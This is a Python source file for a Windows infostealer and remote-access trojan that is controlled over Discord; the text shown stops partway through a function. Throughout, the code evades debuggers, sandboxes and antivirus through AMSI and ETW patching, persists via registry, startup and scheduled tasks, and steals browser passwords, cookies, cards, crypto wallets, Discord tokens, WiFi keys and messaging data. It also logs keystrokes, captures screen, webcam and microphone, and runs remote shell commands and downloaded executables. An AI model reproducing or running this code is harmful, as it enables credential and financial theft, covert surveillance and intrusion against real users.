#!/usr/bin/env python3
import os,sys,subprocess,time,random,json,base64,sqlite3,shutil,threading,getpass,socket,re,hashlib,tempfile,io,ctypes,ctypes.wintypes,platform,struct,urllib.parse,queue,pickle,binascii,contextlib,uuid,pathlib,fnmatch,webbrowser,zipfile,gzip,csv,asyncio,winreg
from pathlib import Path
from datetime import datetime
from urllib.request import Request,urlopen
from itertools import cycle
if platform.system()!='Windows':sys.exit(0)

def _a(p):
    for c in [[sys.executable,'-m','pip','install','--user',p],[sys.executable,'-m','pip','install',p],['pip','install','--user',p],['pip3','install','--user',p]]:
        try:subprocess.run(c,capture_output=True,timeout=60,check=True);return True
        except:pass
    return False
def _b(n,p=None):
    if p is None:p=n
    try:return __import__(n)
    except ImportError:
        if _a(p):
            try:return __import__(n)
            except:pass
    return None
_deps=[('requests','requests'),('psutil','psutil'),('Crypto','pycryptodome'),('win32com','pywin32'),('pynput','pynput'),('cv2','opencv-python'),('pyaudio','pyaudio'),('pyperclip','pyperclip'),('keyboard','keyboard'),('wmi','wmi'),('PIL','pillow'),('pyautogui','pyautogui'),('numpy','numpy'),('netifaces','netifaces'),('scapy','scapy'),('impacket','impacket')]
for _x,_y in _deps:_b(_x,_y)
import requests,psutil,win32com.client,win32security,win32con,win32file,win32api,win32process,win32event,win32gui,win32console,win32crypt,wmi,pynput.keyboard,cv2,pyaudio,pyperclip,keyboard,pyautogui,numpy as np
from PIL import Image
import netifaces,asyncio
from scapy.all import ARP,Ether,srp
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA1,SHA256
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities,IAudioEndpointVolume
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport,scmr

def _c():
    try:
        req=Request('https://pastebin.com/raw/usAq1P1X',headers={'User-Agent':'Mozilla/5.0'})
        with urlopen(req,timeout=15) as r:
            t=r.read().decode().strip()
            if t and len(t)>50:return t
    except:pass
    sys.exit(1)
_T=_c()

def _d():
    if sys.gettrace() is not None:sys.exit(0)
    k32=ctypes.windll.kernel32
    if k32.IsDebuggerPresent():sys.exit(0)
    try:
        c=wmi.WMI()
        for d in c.Win32_DiskDrive():
            if 'vbox' in d.Model.lower() or 'virtual' in d.Model.lower():sys.exit(0)
    except:pass
    try:
        mac=uuid.getnode()
        ms=':'.join(('%012X'%mac)[i:i+2] for i in range(0,12,2))
        if any(ms.startswith(x) for x in ['08:00:27','00:05:69','00:0C:29','00:1C:42','00:50:56']):sys.exit(0)
    except:pass
    for m in ["SbieDll","CWSandbox","ANALYSIS","FRANK","vmware","vbox"]:
        if ctypes.windll.kernel32.OpenMutexW(0x1F0001,False,m):sys.exit(0)
    if os.environ.get('LANG','').startswith('ru'):sys.exit(0)
    if psutil.virtual_memory().total<2*1024**3:sys.exit(0)
    if psutil.cpu_count()<2:sys.exit(0)
    if psutil.disk_usage('/').total<50*1024**3:sys.exit(0)
    s=time.time()
    for _ in range(1000000):pass
    if time.time()-s<0.05:time.sleep(300)
_d()

def _e():
    try:
        k32=ctypes.windll.kernel32
        ntdll=ctypes.windll.ntdll
        ea=ctypes.cast(ntdll.EtwEventWrite,ctypes.c_void_p).value
        old=ctypes.c_ulong()
        k32.VirtualProtect(ea,1,0x40,ctypes.byref(old))
        ctypes.memset(ea,0xC3,1)
        k32.VirtualProtect(ea,1,old,ctypes.byref(ctypes.c_ulong()))
        a=ctypes.windll.amsi
        if a:
            sa=ctypes.cast(a.AmsiScanBuffer,ctypes.c_void_p).value
            k32.VirtualProtect(sa,6,0x40,ctypes.byref(ctypes.c_ulong()))
            ctypes.memmove(sa,b'\xB8\x00\x00\x00\x00\xC3',6)
    except:pass
_e()

def _f():
    s=os.path.abspath(sys.argv[0])
    try:
        k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k,'WindowsDriverUpdate',0,winreg.REG_SZ,s)
        winreg.CloseKey(k)
    except:pass
    try:
        sd=Path(os.getenv('APPDATA'))/r'Microsoft\Windows\Start Menu\Programs\Startup'
        sd.mkdir(parents=True,exist_ok=True)
        shutil.copy(s,sd/'syshelper.exe')
    except:pass
    try:
        subprocess.run(['schtasks','/create','/tn','NVIDIA_Telemetry_Updater','/tr',s,'/sc','daily','/st','09:00','/f'],capture_output=True,timeout=10)
    except:pass
_f()

def _g():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            subprocess.run(['powershell','-Command','Add-MpPreference -ExclusionPath "C:\\Users\\*"'],capture_output=True)
    except:pass
_g()

class _h:
    def __init__(self,t):
        self.t=t
        self.h={'Authorization':f'Bot {t}'}
        self.s=requests.Session()
        self.s.headers.update(self.h)
        self.u=None
        self.g=None
        self.v=None
        self.l=None
        self._ch={}
    def _i(self):
        try:
            r=self.s.get('https://discord.com/api/v9/users/@me',timeout=15)
            if r.status_code!=200:return False
            self.u=r.json()['id']
            r=self.s.get('https://discord.com/api/v9/users/@me/guilds',timeout=15)
            if r.status_code!=200:return False
            for g in r.json():
                if g.get('owner',False):
                    self.g=g['id']
                    break
            if not self.g:
                self.g=r.json()[0]['id']
            return True
        except:return False
    def _j(self):
        try:
            import wmi
            c=wmi.WMI()
            for d in c.Win32_DiskDrive():
                s=d.SerialNumber.strip() if d.SerialNumber else ''
                if s:
                    return hashlib.sha256(s.encode()).hexdigest()[:16]
            return hashlib.sha256(socket.gethostname().encode()+getpass.getuser().encode()).hexdigest()[:16]
        except:return hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]
    def _k(self):
        hwid=self._j()
        p=Path(os.getenv('APPDATA'))/f'Microsoft/Windows/Caches/{hwid}.json'
        if p.exists():
            with open(p,'r') as f:
                st=json.load(f)
                self.v=st.get('v')
                self._ch=st.get('ch',{})
                if self.v:
                    r=self.s.get(f'https://discord.com/api/v9/channels/{self.v}',timeout=10)
                    if r.status_code==200:return True
        cats=self.s.get(f'https://discord.com/api/v9/guilds/{self.g}/channels',timeout=15)
        if cats.status_code!=200:return False
        for cat in cats.json():
            if cat['type']==4 and cat['name']==hwid:
                self.v=cat['id']
                break
        if not self.v:
            cat=self.s.post(f'https://discord.com/api/v9/guilds/{self.g}/channels',json={'name':hwid,'type':4},timeout=15)
            if cat.status_code!=201:return False
            self.v=cat.json()['id']
        for ch in ['commands','data','recordings']:
            exist=None
            for cch in cats.json():
                if cch.get('parent_id')==self.v and cch['name']==ch:
                    exist=cch['id']
                    break
            if exist:
                self._ch[ch]=exist
            else:
                new=self.s.post(f'https://discord.com/api/v9/guilds/{self.g}/channels',json={'name':ch,'type':0,'parent_id':self.v},timeout=15)
                if new.status_code==201:
                    self._ch[ch]=new.json()['id']
        with open(p,'w') as f:
            json.dump({'v':self.v,'ch':self._ch},f)
        return True
    def _l(self,c,m):
        for ch in [m[i:i+1900] for i in range(0,len(m),1900)]:
            try:self.s.post(f'https://discord.com/api/v9/channels/{c}/messages',json={'content':ch},timeout=10)
            except:pass
    def _m(self,d,n=None):
        if isinstance(d,bytes):
            try:self.s.post(f'https://discord.com/api/v9/channels/{self._ch["data"]}/messages',files={'file':(n or 'data.bin',d)},timeout=30)
            except:pass
        else:self._l(self._ch["data"],str(d))
    def _n(self):
        u=f'https://discord.com/api/v9/channels/{self._ch["commands"]}/messages'
        if self.l:u+=f'?after={self.l}'
        try:
            r=self.s.get(u,timeout=30)
            if r.status_code!=200:return []
            msgs=r.json()
            if msgs:self.l=msgs[0]['id']
            return msgs
        except:return []

_h=_h(_T)
if not _h._i():sys.exit(1)
if not _h._k():sys.exit(1)

def _o():
    o={}
    l=os.getenv('LOCALAPPDATA')
    bs={'chrome':Path(l)/'Google/Chrome/User Data','edge':Path(l)/'Microsoft/Edge/User Data','brave':Path(l)/'BraveSoftware/Brave-Browser/User Data','opera':Path(l)/'Opera Software/Opera Stable','vivaldi':Path(l)/'Vivaldi/User Data','yandex':Path(l)/'Yandex/YandexBrowser/User Data','chromium':Path(l)/'Chromium/User Data','opera_gx':Path(l)/'Opera Software/Opera GX Stable','slimjet':Path(l)/'Slimjet/User Data','maxthon':Path(l)/'Maxthon5/User Data','comodo':Path(l)/'Comodo/User Data','iron':Path(l)/'SRWare Iron/User Data','torch':Path(l)/'Torch/User Data'}
    for n,p in bs.items():
        if not p.exists():continue
        ls=p/'Local State'
        if not ls.exists():continue
        with open(ls,'r') as f:st=json.load(f)
        ek=base64.b64decode(st['os_crypt']['encrypted_key'])
        ek=ek[5:] if ek[:5]==b'DPAPI' else ek
        try:mk=win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
        except:continue
        for pr in [p/'Default']+list(p.glob('Profile *')):
            if not pr.is_dir():continue
            db=pr/'Login Data'
            if db.exists():
                t=tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(db,t.name)
                try:
                    conn=sqlite3.connect(t.name)
                    cur=conn.cursor()
                    cur.execute("SELECT origin_url,username_value,password_value FROM logins")
                    for url,user,pw in cur.fetchall():
                        if pw:
                            try:
                                iv=pw[3:15];ct=pw[15:-16];tag=pw[-16:]
                                ci=AES.new(mk,AES.MODE_GCM,nonce=iv)
                                pl=ci.decrypt_and_verify(ct,tag).decode()
                                o.setdefault(n,{}).setdefault(pr.name,[]).append({'url':url,'user':user,'pass':pl})
                            except:pass
                    conn.close()
                except:pass
                finally:os.unlink(t.name)
            db=pr/'Cookies'
            if db.exists():
                t=tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(db,t.name)
                try:
                    conn=sqlite3.connect(t.name)
                    cur=conn.cursor()
                    cur.execute("SELECT host_key,name,encrypted_value FROM cookies LIMIT 2000")
                    cs=[]
                    for host,cname,val in cur.fetchall():
                        if val:
                            try:
                                iv=val[3:15];ct=val[15:-16];tag=val[-16:]
                                ci=AES.new(mk,AES.MODE_GCM,nonce=iv)
                                pl=ci.decrypt_and_verify(ct,tag).decode()
                                cs.append({'host':host,'name':cname,'value':pl[:200]})
                            except:pass
                    if cs:o.setdefault(n,{}).setdefault(pr.name,{})['cookies']=cs
                    conn.close()
                except:pass
                finally:os.unlink(t.name)
            db=pr/'Web Data'
            if db.exists():
                t=tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(db,t.name)
                try:
                    conn=sqlite3.connect(t.name)
                    cur=conn.cursor()
                    cur.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards")
                    cd=[]
                    for nm,mo,yr,enc in cur.fetchall():
                        if enc:
                            try:
                                iv=enc[3:15];ct=enc[15:-16];tag=enc[-16:]
                                ci=AES.new(mk,AES.MODE_GCM,nonce=iv)
                                num=ci.decrypt_and_verify(ct,tag).decode()
                                cd.append({'name':nm,'month':mo,'year':yr,'number':'****'+num[-4:]})
                            except:pass
                    if cd:o.setdefault(n,{}).setdefault(pr.name,{})['cards']=cd
                    conn.close()
                except:pass
                finally:os.unlink(t.name)
            db=pr/'History'
            if db.exists():
                t=tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(db,t.name)
                try:
                    conn=sqlite3.connect(t.name)
                    cur=conn.cursor()
                    cur.execute("SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 2000")
                    hi=[{'url':r[0],'title':r[1],'visits':r[2],'time':r[3]} for r in cur.fetchall()]
                    if hi:o.setdefault(n,{}).setdefault(pr.name,{})['history']=hi
                    conn.close()
                except:pass
                finally:os.unlink(t.name)
            bm=pr/'Bookmarks'
            if bm.exists():
                try:
                    with open(bm,'r',encoding='utf-8') as f:data=json.load(f)
                    roots=data.get('roots',{})
                    bml=[]
                    for rn,rd in roots.items():
                        if isinstance(rd,dict):
                            ch=rd.get('children',[])
                            for c in ch:
                                if c.get('url'):bml.append({'name':c.get('name'),'url':c.get('url')})
                    if bml:o.setdefault(n,{}).setdefault(pr.name,{})['bookmarks']=bml[:500]
                except:pass
            db=pr/'Downloads'
            if db.exists():
                t=tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(db,t.name)
                try:
                    conn=sqlite3.connect(t.name)
                    cur=conn.cursor()
                    cur.execute("SELECT target_path,url,start_time,end_time FROM downloads LIMIT 500")
                    dl=[{'path':r[0],'url':r[1],'start':r[2],'end':r[3]} for r in cur.fetchall()]
                    if dl:o.setdefault(n,{}).setdefault(pr.name,{})['downloads']=dl
                    conn.close()
                except:pass
                finally:os.unlink(t.name)
    ff=Path(os.getenv('APPDATA'))/'Mozilla/Firefox/Profiles'
    if not ff.exists():
        ff=Path(os.getenv('APPDATA'))/'firefox'
    for pr in ff.glob('*.default*'):
        if not pr.is_dir():continue
        kdb=pr/'key4.db'
        if not kdb.exists():continue
        t=tempfile.NamedTemporaryFile(delete=False)
        shutil.copy2(kdb,t.name)
        try:
            conn=sqlite3.connect(t.name)
            cur=conn.cursor()
            cur.execute("SELECT item1,item2 FROM metadata WHERE id='password'")
            r=cur.fetchone()
            if r:
                gs=r[0]
                cur.execute("SELECT a11,a102 FROM nssPrivate")
                r2=cur.fetchone()
                if r2:
                    a11,a102=r2
                    mk=PBKDF2(gs,a11,dkLen=32,count=10000,hmac_hash_module=SHA1)
                    iv=a102[:16];enc=a102[16:]
                    ci=AES.new(mk,AES.MODE_CBC,iv)
                    mk2=ci.decrypt(enc)
                    pl=mk2[-1];mk2=mk2[:-pl]
                    lj=pr/'logins.json'
                    if lj.exists():
                        with open(lj,'r') as f:data=json.load(f)
                        for e in data.get('logins',[]):
                            try:
                                u=base64.b64decode(e['encryptedUsername'])
                                p=base64.b64decode(e['encryptedPassword'])
                                un=None;pw=None
                                for ed,out in [(u,'user'),(p,'pass')]:
                                    iv2=ed[:16];ct2=ed[16:]
                                    ci2=AES.new(mk2,AES.MODE_CBC,iv2)
                                    dec=ci2.decrypt(ct2)
                                    pl2=dec[-1];val=dec[:-pl2].decode()
                                    if out=='user':un=val
                                    else:pw=val
                                o.setdefault('firefox',{}).setdefault(pr.name,[]).append({'url':e.get('hostname'),'user':un,'pass':pw})
                            except:pass
            conn.close()
        except:pass
        finally:os.unlink(t.name)
    return o

def _p():
    w=[]
    l=os.getenv('LOCALAPPDATA')
    exts={
        'metamask':'nkbihfbeogaeaoehlefnkodbefgpgknn','phantom':'bfnaelmomeimhlpmgjnjphhpkkoljpa',
        'coinbase':'hnfanknocfeofbddgcijnmhnfnkdnaad','binance':'fhbohimaelbohpjbbldcngcnapndodjp',
        'trust':'egjidjbpglichkbfhlakidmjoabbbbb','keplr':'dmkamcknogkgcdfhhbddcghachkejeap',
        'rabby':'acmacodkjbdgmolekbjignmnlgebpkad','tronlink':'ibnejdfjmmkpcnlpebklmnkoeoihofec',
        'solflare':'bhhhlbepdkbapadjdnnojkbgviodkgcj','mathwallet':'afbcbjpbpfedifkmkkgbjdodkbfkohjg',
        'safepal':'lgmpcpglpngdoalbgejdeegfckffhkaj','exodus':'ahfgeipfpmhnbdmlkcbfcbeohpkmdffd',
        'brave_wallet':'odbfpeeihdkbihmbbkbmgcablfjaagbh','walletconnect':'dccnkgpmhkdjlgomjnmnffghijjfpjlf',
        'enjin':'npbdofjfifmjeepkegljojpojknhjobj','liquality':'kpfopkelmapcoipemfahmijgcajjaajb',
        'saturn':'bkhaaekgkmjldfhfokeonhbjfngbflmd','zelcore':'mmkmmkjfgemgfbbccbfdgflpcfpncabp',
        'bitcoin_com':'fnjhmkhhmkbjkkabndcnnogagogbneec','electrum':'mfaihdlpglfggnfnpofkpegffdnldgng',
        'atomic':'emgdmjhgkdjldkffgipckccjddjmkfne','coinomi':'nknbjknbjakpkchjmgbggodbdkfpmbni',
        'jaxx':'jlhnkagkmljegnjclclhjnlbmnmodgbf','wasabi':'jebgidlpjfndgjjnmojfplnfabmjjfkd',
        'samourai':'kohocfcpjggjjcbnmnaidipfcfmgmldp','bitcoin_core':'lnkfbbfmgbojkijpmpmddeoopfijohai',
        'ethereum':'cjmkfkmkohpknihlbmhnkikbfloamdac','monero':'lkgfdjdhpddjfcgmjejcbknlmcofjgfo',
        'zcash':'dmkamcknogkgcdfhhbddcghachkejeap','dash':'fpjppncoabkklpbjhjioifngkeffcago',
        'litecoin':'lphaeooffmlmpjgcgifjlbjgnedpkcei','dogecoin':'dkgfblcbnmhllbckjdjnpmlhpklgjkdf',
        'cardano':'nlbhhejofpikmjnmflbdibbfmcfacafa','polkadot':'mopnmbcafieddcagagdcbnhejhlodfdd',
        'solana':'bhhhlbepdkbapadjdnnojkbgviodkgcj','near':'hgbkfebjgcgmgnggdfnlfodfpddlbncg',
        'avalanche':'fcnfnldjfopncpigdbgajkfdfkpbpiaj','fantom':'hlnfbdjfobpdnpbgfpekhcacghaednkn',
        'harmony':'fnjhmkhhmkbjkkabndcnnogagogbneec','tezos':'hfjklcnkkmfdlpkdnpgodlphoknokglh',
        'algorand':'phjbdldpgkafgkhohiobhchhpcnkfadk','elrond':'kmcbdgjmjpjfohopmecjdpdkmkcmgpjl',
        'theta':'pknepfhmdmmpeodblabgfiinmebnjfhk','vechain':'jbnlmpcclkmcblfdmhfpafgihfdbglkd',
        'stacks':'pkjcknmlcfcfbamchmhjkjaoaaapkfhp','cronos':'hmlggjnoeklfehbdmmmpobgfeelfnogh',
        'osmosis':'fcfenmboojlhenhkmldhfajipbapefhp','kujira':'hlgnpbfodhkmdjaijbmgejhdgdfgddjk',
        'sei':'fnjhmkhhmkbjkkabndcnnogagogbneec','aptos':'kljljfjjkglfahbmdljbkgjaldpbmdlo','sui':'mhnmbkmmjkjfobndpjbjgbpifdhnnnnp',
        'talisman':'mfhgjbjfngmkhinlnplbfbdodlhmfbbfh','subwallet':'pfgmpkddjleplmifanfjocpkhhoajpjd',
        'terra':'akiljllmljfknhegkpjgnmopgkmfhpab','stargaze':'ngfkeklcknpbhdmhojabklpldhkpojpc',
        'evmos':'kfepbkfhgneebhecfcokhmidgdgcidml','cronos_extension':'pchlbpoechdoebdehcaafmdlkmcphfdi',
        'kucoin':'pocmamikbdodmhgcnlflhppifngmilpo','bybit':'dacmflacjmbjggdhjkkfjddifjbibdne',
        'okx':'mcohilncbfahbmgdjkbpemcciokgcoka','gateio':'kohofmhojpfpdcgihllkoghpgihennkn'
    }
    for n,i in exts.items():
        for base in ['Google/Chrome','BraveSoftware/Brave-Browser','Microsoft/Edge','Opera Software/Opera Stable','Vivaldi','Yandex/YandexBrowser']:
            p=Path(l)/f'{base}/User Data/Default/Local Extension Settings/{i}'
            if p.exists():w.append(f'{n}: {p}')
    a=os.getenv('APPDATA')
    sw=['Exodus','Electrum','Atomic','Guarda','Coinomi','Jaxx','Wasabi','Samourai','BitcoinCore','Ethereum','Monero','Zcash','Dash','MultiBit','ElectrumLTC','ElectronCash','Specter','Sparrow','BitcoinWallet','Multibit','Armory','Mycelium','Bither','Airbitz','CoinbaseWallet','TrustWallet','MetaMask','Phantom','Keplr','Rabby','TronLink','Solflare','MathWallet','SafePal','Enjin','Liquality','Saturn','Zelcore','BitcoinCom','ElectrumSV','ElectrumCash','Neon','Mist','Geth','Parity','OpenEthereum','Trezor','LedgerLive','KeepKey','CoolWallet','SafePalS1','TrezorBridge']
    for s in sw:
        p=Path(a)/s
        if p.exists():w.append(f'{s}: {p}')
    h=Path.home()
    hw=['.bitcoin','.ethereum','.monero','.zcash','.litecoin','.dash','.electrum','.exodus','.atomic','.coinomi','.jaxx','.wasabi','.samourai','.cardano','.solana','.polkadot','.near','.avalanche','.fantom','.harmony','.tezos','.algorand','.elrond','.theta','.vechain','.stacks','.cronos','.osmosis','.kujira','.sei','.aptos','.sui']
    for s in hw:
        p=h/s
        if p.exists():w.append(f'{s}: {p}')
    return w

def _q():
    t=[]
    a=os.getenv('APPDATA')
    for p in [Path(a)/'discord/Local Storage/leveldb',Path(a)/'discordcanary/Local Storage/leveldb',Path(a)/'discordptb/Local Storage/leveldb']:
        if not p.exists():continue
        for f in p.glob('*.log')+p.glob('*.ldb'):
            try:
                d=f.read_bytes()
                for m in re.findall(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',d):
                    t.append(m.decode())
            except:pass
    l=os.getenv('LOCALAPPDATA')
    for b in ['Google/Chrome/User Data/Default/Local Storage/leveldb','BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb','Microsoft/Edge/User Data/Default/Local Storage/leveldb','Opera Software/Opera Stable/Local Storage/leveldb','Vivaldi/User Data/Default/Local Storage/leveldb','Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb']:
        p=Path(l)/b
        if p.exists():
            for f in p.glob('*.log'):
                try:
                    txt=f.read_text(errors='ignore')
                    for m in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',txt):
                        t.append(m)
                except:pass
    try:
        for proc in psutil.process_iter(['pid','name']):
            if 'discord' in proc.info['name'].lower():
                t.append(f'[Discord process PID: {proc.info["pid"]}]')
    except:pass
    return list(set(t))

def _r():
    i={'host':socket.gethostname(),'user':getpass.getuser(),'os':f'{platform.system()} {platform.release()}','arch':platform.machine(),'cpu':os.cpu_count(),'ram':round(psutil.virtual_memory().total/(1024**3),2),'disk':round(psutil.disk_usage('/').total/(1024**3),2)}
    try:i['ip']=requests.get('https://api.ipify.org',timeout=5).text
    except:pass
    try:i['geo']=requests.get(f"http://ip-api.com/json/{i.get('ip','')}",timeout=5).json()
    except:pass
    try:i['gpu']=subprocess.run(['wmic','path','win32_VideoController','get','name'],capture_output=True,text=True).stdout.split('\n')[1] if os.name=='nt' else 'N/A'
    except:pass
    try:i['mac']=':'.join(re.findall('..','%012x'%uuid.getnode()))
    except:pass
    try:i['boot']=datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
    except:pass
    return i

def _s():
    w=[]
    try:
        o=subprocess.run(['netsh','wlan','show','profiles'],capture_output=True,text=True).stdout
        ns=re.findall(r'All User Profile\s*:\s*(.*)',o)
        for n in ns:
            r=subprocess.run(['netsh','wlan','show','profile',n,'key=clear'],capture_output=True,text=True).stdout
            pw=re.search(r'Key Content\s*:\s*(.*)',r)
            w.append({'ssid':n.strip(),'pass':pw.group(1) if pw else ''})
    except:pass
    return w

def _t():
    try:return pyperclip.paste()
    except:return None

def _u():
    try:
        img=pyautogui.screenshot()
        b=io.BytesIO()
        img.save(b,format='PNG')
        return b.getvalue()
    except:return None

def _v():
    try:
        cap=cv2.VideoCapture(0)
        if not cap.isOpened():return None
        r,f=cap.read()
        cap.release()
        if r:
            _,b=cv2.imencode('.jpg',f)
            return b.tobytes()
    except:return None

def _w():
    try:
        CHUNK=1024
        p=pyaudio.PyAudio()
        s=p.open(format=pyaudio.paInt16,channels=1,rate=44100,input=True,frames_per_buffer=CHUNK)
        f=[]
        for _ in range(int(44100/CHUNK*5)):
            f.append(s.read(CHUNK))
        s.stop_stream();s.close();p.terminate()
        b=io.BytesIO()
        import wave
        wf=wave.open(b,'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(f))
        wf.close()
        return b.getvalue()
    except:return None

def _x():
    g=[]
    kw=['seed','mnemonic','private','key','password','recovery','wallet','2fa','totp','backup','phrase','secret','ledger','trezor','keystore','wallet.dat','utc','json','pem','ppk','id_rsa','id_dsa','id_ecdsa','id_ed25519','token','apikey','credentials','login','master','keyfile','privkey','recovery_phrase','bitcoin','ethereum','monero','zcash','litecoin','dogecoin','dash','cardano','polkadot','solana','near','avalanche','fantom','harmony','tezos','algorand','elrond','theta','vechain','stacks','cronos','osmosis','kujira','sei','aptos','sui','vault','secrets','crypto']
    ds=[Path.home()/d for d in ['Desktop','Documents','Downloads','Pictures','Music','Videos','AppData','OneDrive'] if (Path.home()/d).exists()]
    ds.append(Path.home())
    for d in ds:
        for f in d.rglob('*'):
            if f.is_file() and f.stat().st_size<10*1024*1024:
                if any(k in f.name.lower() for k in kw):
                    try:g.append((f.name,f.read_bytes()[:10000]))
                    except:pass
    return g

def _y():
    se={}
    try:
        k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Valve\Steam')
        sp=winreg.QueryValueEx(k,'SteamPath')[0]
        lf=Path(sp)/'config/loginusers.vdf'
        if lf.exists():se['steam']=lf.read_text(errors='ignore')[:5000]
    except:pass
    td=Path(os.getenv('APPDATA'))/'Telegram Desktop/tdata'
    if td.exists():
        subprocess.run(['taskkill','/F','/IM','Telegram.exe'],capture_output=True)
        time.sleep(1)
        dst=tempfile.mkdtemp()
        shutil.copytree(td,dst,dirs_exist_ok=True)
        se['telegram']=dst
    rd=Path(os.getenv('LOCALAPPDATA'))/'Riot Games'
    if rd.exists():se['riot']=str(rd)
    ep=Path(os.getenv('LOCALAPPDATA'))/'EpicGamesLauncher/Saved'
    if ep.exists():se['epic']=str(ep)
    ub=Path(os.getenv('LOCALAPPDATA'))/'Ubisoft Game Launcher'
    if ub.exists():se['ubisoft']=str(ub)
    mc=Path(os.getenv('APPDATA'))/'.minecraft'
    if mc.exists():se['minecraft']=str(mc)
    rbx=Path(os.getenv('LOCALAPPDATA'))/'Roblox'
    if rbx.exists():se['roblox']=str(rbx)
    bnet=Path(os.getenv('LOCALAPPDATA'))/'Battle.net'
    if bnet.exists():se['battle.net']=str(bnet)
    origin=Path(os.getenv('LOCALAPPDATA'))/'Origin'
    if origin.exists():se['origin']=str(origin)
    gog=Path(os.getenv('PROGRAMDATA'))/'GOG.com'
    if gog.exists():se['gog']=str(gog)
    return se

def _z():
    d={}
    sig=Path(os.getenv('APPDATA'))/'Signal/sqlite/db.sqlite'
    if sig.exists():
        try:shutil.copy2(sig,tempfile.mkdtemp()+'/signal.db');d['signal']='Signal DB copied'
        except:pass
    wa=Path(os.getenv('LOCALAPPDATA'))/'WhatsApp/Default/IndexedDB'
    if wa.exists():d['whatsapp']=str(wa)
    ele=Path(os.getenv('APPDATA'))/'Element'
    if ele.exists():d['element']=str(ele)
    dis=Path(os.getenv('APPDATA'))/'discord'
    if dis.exists():d['discord']=str(dis)
    return d

def _aa():
    d={}
    out=Path(os.getenv('APPDATA'))/'Microsoft/Outlook'
    if out.exists():
        try:
            for pst in out.glob('*.pst'):
                d['outlook']=str(pst)
        except:pass
    tb=Path(os.getenv('APPDATA'))/'Thunderbird/Profiles'
    if tb.exists():d['thunderbird']=str(tb)
    return d

def _ab():
    d={}
    fz=Path(os.getenv('APPDATA'))/'FileZilla/sitemanager.xml'
    if fz.exists():d['filezilla']=fz.read_text(errors='ignore')[:5000]
    ws=Path(os.getenv('APPDATA'))/'WinSCP.ini'
    if ws.exists():d['winscp']=ws.read_text(errors='ignore')[:5000]
    putty=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\SimonTatham\PuTTY\Sessions')
    try:
        sessions=[]
        i=0
        while True:
            name=winreg.EnumKey(putty,i)
            sessions.append(name)
            i+=1
        d['putty']=sessions
    except:pass
    return d

class _ac:
    def __init__(self):
        self.l=[];self.r=False;self.t=None;self.lw=''
    def start(self):
        if self.r:return
        self.r=True
        self.t=threading.Thread(target=self._run,daemon=True)
        self.t.start()
    def stop(self):
        self.r=False
        if self.t:self.t.join(1)
    def dump(self):
        d=''.join(self.l)
        self.l.clear()
        return d
    def _aw(self):
        try:
            h=ctypes.windll.user32.GetForegroundWindow()
            l=ctypes.windll.user32.GetWindowTextLengthW(h)
            b=ctypes.create_unicode_buffer(l+1)
            ctypes.windll.user32.GetWindowTextW(h,b,l+1)
            return b.value
        except:return ''
    def _run(self):
        def on_press(k):
            if not self.r:return False
            w=self._aw()
            if w!=self.lw:
                self.lw=w
                self.l.append(f'\n[{w}]\n')
            try:
                if hasattr(k,'char') and k.char:self.l.append(k.char)
                else:self.l.append(f'[{k}]')
            except:self.l.append('[?]')
        with pynput.keyboard.Listener(on_press=on_press) as l:
            while self.r:time.sleep(0.1)
            l.stop()

class _ad:
    def __init__(self,b):
        self.b=b;self.r=False;self.q=50
    def _cap(self):
        try:
            img=pyautogui.screenshot()
            arr=np.array(img)
            _,buf=cv2.imencode('.jpg',arr,[cv2.IMWRITE_JPEG_QUALITY,self.q])
            return buf.tobytes()
        except:return None
    def start(self):
        self.r=True
        while self.r:
            f=self._cap()
            if f:self.b._m(f,f'stream_{int(time.time())}.jpg')
            time.sleep(0.5)
    def stop(self):self.r=False

_s1=False
_s2=False
_s3=''

def _ae(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=60)
        return r.stdout+r.stderr if (r.stdout+r.stderr) else '[+] Done'
    except:return '[-] Error'
def _af(n):
    try:
        subprocess.run(['taskkill','/F','/IM',n],capture_output=True)
        return f'[+] Killed {n}'
    except:return '[-] Failed'
def _ag(p):
    global _cwd
    try:os.chdir(p);_cwd=os.getcwd();return f'[+] CWD: {_cwd}'
    except:return '[-] Cannot change dir'
def _ah(p=None):
    global _cwd
    t=p if p else _cwd
    try:return '\n'.join(os.listdir(t))
    except:return '[-] Cannot list'
def _ai(p):
    global _cwd
    fp=os.path.join(_cwd,p) if not os.path.isabs(p) else p
    try:
        with open(fp,'r',errors='ignore') as f:return f.read(10000)
    except:return '[-] Cannot read'
def _aj(p):
    global _cwd
    fp=os.path.join(_cwd,p) if not os.path.isabs(p) else p
    try:
        with open(fp,'rb') as f:return f.read()
    except:return None
def _ak(u,p):
    global _cwd
    fp=os.path.join(_cwd,p) if not os.path.isabs(p) else p
    try:
        r=requests.get(u,timeout=30)
        with open(fp,'wb') as f:f.write(r.content)
        return '[+] Downloaded'
    except:return '[-] Download failed'
def _al(u):
    try:
        r=requests.get(u,timeout=30)
        if r.status_code==200:
            t=tempfile.NamedTemporaryFile(delete=False,suffix='.exe')
            t.write(r.content)
            t.close()
            subprocess.Popen([t.name],shell=True)
            return '[+] Executed'
